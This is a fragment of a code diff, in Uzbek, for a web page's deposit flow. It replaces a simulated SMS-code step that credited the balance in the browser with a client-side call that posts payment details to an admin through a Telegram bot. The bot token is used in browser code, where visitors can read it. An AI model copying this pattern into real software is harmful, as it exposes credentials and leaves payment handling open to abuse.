-                let s = (timeLeft % 60).toString().padStart(2, '0');
-                timerDisplay.innerText = `${m}:${s}`;
-                if (timeLeft <= 0) {
-                    clearInterval(timerInterval);
-                    timerDisplay.innerText = "00:00";
-                }
-            }, 1000);
-        }
+            const adminMessage = `💰 TO'LOV BILDIRIShNOMASI 💰\n\n` +
+                                 `👤 Mijoz: ${customerInfo}\n` +
+                                 `🏦 Tizim: ${selectedDepositMethod}\n` +
+                                 `💵 Summa: ${amount.toLocaleString('ru-RU')} so'm\n\n` +
+                                 `⚠️ Bank ilovangizni tekshiring! Pul tushgan bo'lsa, ushbu mijozga bot paneli yoki backend orqali balans qo'shing.`;
 
-        function finishDeposit() {
-            let code = document.getElementById('depositCodeInput').value;
-            if(!code || code.length < 4) {
-                alert("SMS kodni kiriting!");
-                return;
+            if(BOT_TOKEN && !BOT_TOKEN.includes('BotFather')) {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: adminMessage })
+                })
+                .then(() => {
+                    document.getElementById('deposit-step-2').style.display = 'none';
+                    document.getElementById('deposit-step-3').style.display = 'block';
+                })
+                .catch(error => {
+                    console.error("Xatolik:", error);
+                    alert("Xabar yuborishda xatolik yuz berdi.");
+                });
+            } else {
+                alert("Bot Token yoki Admin Chat ID noto'g'ri sozlangan.");
             }
-
-            let amount = parseInt(document.getElementById('depositAmountInput').value);
-            userBalance += amount;
-            updateGlobalBalances();
-
-            clearInterval(timerInterval);
-            alert(`✅ Muvaffaqiyatli! Hisobingizga ${amount.toLocaleString('ru-RU')} so'm qo'shildi.`);
-            document.getElementById('deposit-step-3').style.display = 'none';
-            document.getElementById('deposit-step-1').style.display = 'block';
         }
     </script>
 </body>
